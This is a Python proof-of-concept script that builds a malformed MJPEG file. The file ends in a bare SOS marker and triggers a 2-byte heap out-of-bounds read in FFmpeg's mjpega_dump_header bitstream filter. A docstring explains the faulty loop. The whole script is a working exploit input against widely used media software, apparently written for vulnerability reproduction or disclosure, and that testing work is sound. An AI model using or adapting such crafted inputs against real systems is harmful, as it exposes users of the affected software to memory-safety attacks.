#!/usr/bin/env python3
"""
PoC generator for VULN 001: Heap OOB Read in libavcodec/bsf/mjpega_dump_header.c

The vulnerability is in the loop at lines 65-76:
    for (i = 0; i < in->size - 1; i++) {
        ...
        case SOS:
            ...
            AV_RB16(in->data + i + 2)  // line 76: OOB when i == in->size - 2
        ...
    }

When the SOS marker (0xFF 0xDA) appears as the last two bytes of the packet,
i == in->size - 2, so `in->data + i + 2` == `in->data + in->size` which is
past the end of the heap allocation — 2-byte heap OOB read.

We build a minimal valid-looking MJPEG frame that ends with 0xFF 0xDA (no length
field, no scan data after the marker) so the packet's last two bytes are SOS.
"""

import struct
import os

def build_mjpeg():
    data = b''

    # SOI
    data += b'\xFF\xD8'

    # APP0 (JFIF header) — FFmpeg uses this to identify JPEG/MJPEG
    jfif_payload = b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    app0_len = len(jfif_payload) + 2  # includes the 2-byte length field itself
    data += b'\xFF\xE0' + struct.pack('>H', app0_len) + jfif_payload

    # DQT — minimal quantization table (table 0, precision 8-bit, 64 coefficients)
    dqt_payload = b'\x00' + bytes([16] * 64)  # table ID=0, all coefficients=16
    dqt_len = len(dqt_payload) + 2
    data += b'\xFF\xDB' + struct.pack('>H', dqt_len) + dqt_payload

    # SOF0 — baseline DCT frame header, 1x1 pixel, 1 component
    # length(2) precision(1) height(2) width(2) ncomp(1) [comp_id(1) sampling(1) qtbl(1)]*ncomp
    sof0_payload = struct.pack('>HBHHB', 11, 8, 1, 1, 1)  # len=11, prec=8, H=1, W=1, N=1
    sof0_payload += struct.pack('BBB', 1, 0x11, 0)         # comp1: id=1, sampling=1x1, qtbl=0
    data += b'\xFF\xC0' + sof0_payload

    # DHT — minimal Huffman table (DC, table 0, empty — 0 codes for each length)
    dht_payload = b'\x00' + b'\x00' * 16  # table class+id=0, 16 count bytes all zero
    dht_len = len(dht_payload) + 2
    data += b'\xFF\xC4' + struct.pack('>H', dht_len) + dht_payload

    # SOS marker — placed as the VERY LAST two bytes, no length or scan data follows.
    # This is intentionally malformed: a real SOS would have a segment header and
    # entropy-coded data. We deliberately omit them so the packet ends at 0xFF 0xDA.
    data += b'\xFF\xDA'

    return data


output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_001_input.mjpeg')
frame = build_mjpeg()

with open(output_path, 'wb') as f:
    f.write(frame)

print(f'Generated: {output_path}')
print(f'File size: {len(frame)} bytes')
print(f'Last 4 bytes: {frame[-4:].hex()}')
assert frame[-2:] == b'\xFF\xDA', "ERROR: file must end with FF DA"
print('Assertion OK: last two bytes are FF DA (SOS marker)')
